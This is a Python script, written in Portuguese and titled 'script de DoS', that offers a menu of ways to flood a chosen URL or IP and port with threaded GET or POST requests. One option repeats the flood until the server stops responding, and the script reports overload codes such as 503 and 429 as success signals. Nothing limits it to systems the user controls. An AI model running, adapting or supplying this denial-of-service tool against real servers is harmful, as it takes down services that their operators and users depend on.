import os
import requests
import threading
import pyfiglet
from PIL import Image
import time
from rich import print

def limpar_tela():
    os.system('cls' if os.name == 'nt' else 'clear')

def criar_banner(texto):
    banner = pyfiglet.figlet_format(texto, font='standard')
    return banner

def imprimir_banner():
    limpar_tela()
    banner = criar_banner(' script de DoS ')
    print(f"\033  {banner} \033")

def fazer_requisicao(url, metodo, headers=None, dados=None):
    try:
        if metodo == 'GET':
            resposta = requests.get(url, headers=headers)
        elif metodo == 'POST':
            resposta = requests.post(url, headers=headers, data=dados)
        else:
            print(f"\033 Método {metodo} não suportado \033")
            return
        print(f"\033[93m Requisição feita para {url} - Status: {resposta.status_code} \033[0m")
        
        if resposta.status_code == 503 or resposta.status_code == 429:
            print(f"\033[91mServidor sobrecarregado! ({resposta.status_code})\033[0m")
        elif resposta.elapsed.total_seconds() > 5:
            print(f"\033[91mTempo de resposta alto! ({resposta.elapsed.total_seconds()} segundos)\033[0m")
            
    except requests.exceptions.RequestException as e:
        print(f"\033[91mErro ao fazer requisição para {url}: {e}\033[0m")

def criar_menu():
    limpar_tela()
    imprimir_banner()
    print("\033 ## ************************************** \033")
    print("\033 ## *            Meu Script            * \033")
    print("\033 ## ************************************** \033")
    print("\033 ## 1. Testar URL \033")
    print("\033 ## 2. Testar IP \033")
    print("\033 ## 3. Testar até o servidor não responder \033")
    print("\033 ## 4. Teste de sobrecarga (flood) \033")
    print("\033 ## 5. Teste de estresse \033")
    print("\033 ## 6. Sair \033")

def main():
    while True:
        criar_menu()
        escolha = input("Escolha uma opção: ")
        
        if escolha == "1":
            url = input("Digite a URL: ")
            metodo = input("Digite o método (GET/POST): ")
            num_requisicoes = int(input("Digite o número de requisições: "))
            
            threads = []
            for i in range(num_requisicoes):
                thread = threading.Thread(target=fazer_requisicao, args=(url, metodo))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
                
        elif escolha == "2":
            ip = input("Digite o IP: ")
            porta = int(input("Digite a porta: "))
            metodo = input("Digite o método (GET/POST): ")
            num_requisicoes = int(input("Digite o número de requisições: "))
            
            url = f"http://{ip}:{porta}"
            
            threads = []
            for i in range(num_requisicoes):
                thread = threading.Thread(target=fazer_requisicao, args=(url, metodo))
                thread.start()
                threads.append(thread)
            for thread in threads:
                thread.join()
                
        elif escolha == "3":
            url = input("Digite a URL: ")
            metodo = input("Digite o método (GET/POST): ")
            num_requisicoes = int(input("Digite o número de requisições: "))
            intervalo = float(input("Digite o intervalo entre requisições (segundos): "))
            
            while True:
                threads = []
                for i in range(num_requisicoes):
                    thread = threading.Thread(target=fazer_requisicao, args=(url, metodo))
                    thread.start()
                    threads.append(thread)
                for thread in threads:
                    thread.join()
                time.sleep(intervalo)
                
        elif escolha == "4":
            url = input("Digite a URL: ")
            metodo = input("Digite o método (GET/POST):")
            num_requisicoes = int(input("Digite o número de requisições: "))
            intervalo = float(input("Digite o intervalo entre requisições (segundos): "))
           
            threads = []
            for i in range(num_requisicoes):
                thread = threading.Thread(target=fazer_requisicao, args=(url, metodo))
                thread.start()
                threads.append(thread)
                time.sleep(intervalo)
            for thread in threads:
                thread.join()
                
        elif escolha == "5":
            url = input("Digite a URL: ")
            metodo = input("Digite o método (GET/POST): ")
            num_requisicoes = int(input("Digite o número de requisições: "))
            intervalo = float(input("Digite o intervalo entre requisições (segundos): "))
            
            while True:
                fazer_requisicao(url, metodo)
                time.sleep(intervalo)
                
        elif escolha == "6":
            break
        
        else:
            print("\033[91mOpção inválida. Tente novamente.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
